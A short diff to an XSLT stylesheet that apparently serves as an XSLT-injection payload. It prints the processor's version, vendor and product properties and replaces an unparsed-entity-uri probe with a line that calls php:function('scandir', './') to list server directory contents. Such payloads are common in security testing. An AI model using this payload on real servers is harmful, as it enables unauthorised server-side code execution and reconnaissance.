@@ -9,17 +9,9 @@
  Version: <xsl:value-of select="system-property('xsl:version')" /><br />
  Vendor: <xsl:value-of select="system-property('xsl:vendor')" /><br />
  Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" /><br />
-  
  
-  
-   <h3>unparsed-entity-uri()</h3>
- <ul>
- <li>
- <b>unparsed-entity-uri('currentpath')</b> =
- <xsl:value-of select="unparsed-entity-uri('currentpath')"/>
- </li>
- </ul>
-  
+   EXEC : <xsl:value-of select="php:function('scandir', './')" /> <br />
+ 
  <xsl:if test="system-property('xsl:product-name')">
  Product Name: <xsl:value-of select="system-property('xsl:product-name')" /><br />
  </xsl:if>
